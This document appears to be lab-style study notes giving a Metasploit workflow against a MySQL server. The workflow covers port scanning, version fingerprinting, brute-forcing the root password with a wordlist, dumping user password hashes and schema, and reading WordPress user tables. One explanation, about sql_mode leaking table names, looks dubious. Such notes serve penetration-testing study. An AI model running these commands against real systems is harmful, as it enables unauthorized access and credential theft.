## Overview

- **MySQL**: Open-source relational database management system using SQL; commonly stores web app data (users, sessions, configs).
- **Default Port**: `3306/TCP` (but can be changed).
- Goal: Enumerate version, brute-force credentials, dump schema/data.

---
## Step-by-Step Enumeration workflow :

### 1. Confirm MySQL Is Running

```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 3306
run
```

> ðŸ” Some orgs change the port â€” always verify with a port scan first.

---
### 2. Identify Version & OS

```msf
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.168.1.10
run
```

â†’ Returns MySQL version + underlying OS (e.g., `Linux`, `Windows`).

---
### 3. Brute-Force Credentials

> ðŸ’¡ **Target `root`** â€” it has full privileges by default.

```msf
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.10
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

âœ… Success: `root:twinkle`

---
### 4. Enumerate Database Info (Requires Valid Creds)

```msf
use admin/mysql/mysql_enum
set RHOSTS 192.168.1.10
set USERNAME root
set PASSWORD twinkle
run
```

Returns:
- MySQL version & architecture
- **Hostname**: The **machine name** where MySQL is running (not DB or user name)
- List of **database users** + **password hashes**
- User privileges

> ðŸ“Œ All data is auto-saved to Metasploit DB â†’ view later with `creds`, `loot`.

---
### 5. Execute Custom SQL Queries

```msf
use admin/mysql/mysql_sql
set RHOSTS 192.168.1.10
set USERNAME root
set PASSWORD twinkle
set SQL show databases; use wordpress; show tables;
run
```

---
### 6. Dump Database Schema (No Auth Needed?)

```msf
search mysql_schemadump
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS 192.168.1.10
set USERNAME root          # Optional but may not work without it
set PASSWORD twinkle       # Optional but may not work without it
run
```

â“ **Why no credentials?**  

> - This module exploits **information leakage in MySQL error messages** or **anonymous access** (rare).  
> - In most real cases, **it will fail without valid creds**.  
> - If it works, itâ€™s due to misconfiguration (e.g., `sql_mode=ERROR_FOR_DIVISION_BY_ZERO` exposing table names).

âœ… Best practice: **Use only after obtaining credentials**.

---
### 7. Verify & Access Manually

Exit Metasploit and connect directly:
```bash
mysql -h 192.168.1.10 -u root -p
# Enter password: twinkle
```

Now run any query:
```sql
SHOW DATABASES;
USE wordpress;
SELECT * FROM wp_users;
```

---
### 8. Review Collected Data (In Workspace)

Back in `msfconsole`:

```msf
hosts      # Target info
services   # Port 3306 confirmed
creds      # Cracked: root:twinkle
loot       # Hashes, schema dumps
```

> âœ… All findings are **automatically saved** to the current workspace.
> âš ï¸ Never assume MySQL is on 3306 â€” always scan first.  
> ðŸ”‘ Always target `root` â€” itâ€™s the golden ticket in MySQL.